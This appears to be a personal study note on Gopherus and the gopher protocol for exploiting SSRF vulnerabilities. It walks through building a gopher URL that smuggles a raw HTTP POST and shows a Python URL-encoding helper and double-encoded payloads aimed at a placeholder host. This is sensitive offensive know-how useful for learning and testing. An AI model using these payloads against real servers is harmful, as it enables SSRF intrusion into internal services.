### General Notes

Gopherus is a tool that utilizes the **gopher** protocol to exploit [[SSRF]] vulnerabilities.
- Helps in achieving *remote code execution*.
-  [GitHub repo](https://github.com/tarunkant/Gopherus).

It helps in generating the payload link that will be used to exploit the vulnerability.
- Using the **gopher** protocol, it allows the attacker to add `post` parameters using only the URL, which is something impossible to do in [[HTTP]].

> The **gopher** protocol requires that all special characters use [[Web Encoding]] and be URL-encoded. 

---
### Sending an `HTTP` request with Gopher Protocol

To do that, a valid URL must be created that contains the following:
1. the gopher scheme: `gopher://`
2. the target host: `gopher://server.com`
3. the target port: `gopher://server.com:80/`
4. the underscore and the [[HTTP]] verb: `gopher://server.com:80/_POST`
5. after that follows the [[Transport Layer#TCP]] payload.

```http
POST /index.php HTTP/1.1
Host: server.com
Content-Length: 17
Content-Type: application/x-www-form-urlencoded

username=username
```
- Construct the data that is to be sent using gopher as a TCP packet in order to easily create the TCP payload to be added to the gopher URL.

> For `POST` requests, the `host`, `Content-Length`, and `Content-Type` headers are mandatory. 

6. The next step is to URL encode all the special characters in this TCP payload, and then append it to the link in step 4. (the spaces and new lines in this case.) This can be done using the python library `urllib.parse` and this code:

```python
import urllib.parse

def url_encode():
    print("Enter the string to be url encoded")
    print("Enter 'end' to stop input")
    input_string = ""

    while True:
        line = input()
        if line == 'end':
            break
        else:
            input_string += line + '\n'

    encoded_string = urllib.parse.quote(input_string)
    print("Encoded string:")
    print(encoded_string)
   
url_encode()
```

This outputs: 

```
POST%20/index.php%20HTTP/1.1%0AHost%3A%20server.com%0AContent-Length%3A%2017%0AContent-Type%3A%20application/x-www-form-urlencoded%0A%0Ausername%3Dusername
```

Appending it to the link we have created above in step 4:

```
gopher://server.com:80/_POST%20/index.php%20HTTP/1.1%0AHost%3A%20server.com%0AContent-Length%3A%2017%0AContent-Type%3A%20application/x-www-form-urlencoded%0A%0Ausername%3Dusername
```

7. Then encode it all again one last time, we get the complete gopher url.

```
gopher%3A//server.com%3A80/_POST%2520/index.php%2520HTTP/1.1%250AHost%253A%2520server.com%250AContent-Length%253A%252017%250AContent-Type%253A%2520application/x-www-form-urlencoded%250A%250Ausername%253Dusername
```

---
